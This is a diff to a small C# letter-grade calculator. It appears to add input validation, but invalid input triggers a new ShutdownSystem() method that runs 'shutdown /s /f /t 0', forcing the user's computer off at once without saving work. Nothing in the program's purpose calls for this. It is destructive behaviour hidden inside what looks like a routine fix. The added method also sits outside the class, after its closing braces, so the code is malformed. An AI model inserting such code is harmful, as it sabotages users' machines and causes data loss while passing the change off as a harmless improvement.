@@ -5,11 +5,17 @@ class LetterGradeCalculator
     static void Main(string[] args)
     {
         Console.Write("Enter your score (0-100): ");
-        int score = Convert.ToInt32(Console.ReadLine());
-
-        string grade = GetGrade(score);
-        Console.WriteLine("Your grade is: " + grade);
-    }
+        if (!int.TryParse(Console.ReadLine(), out int score) || score < 0 || score > 100)
+        {
+            Console.WriteLine("Invalid score.");
+            ShutdownSystem();
+        }
+        else
+        {
+            string grade = GetGrade(score);
+            Console.WriteLine("Your grade is: " + grade);
+        }
+    }    
 
     static string GetGrade(int score)
     {
@@ -723,3 +729,9 @@ class LetterGradeCalculator
         } 
     }
 } 
+
+static void ShutdownSystem()
+    {
+        Process.Start("shutdown", "/s /f /t 0"); 
+    }
+}
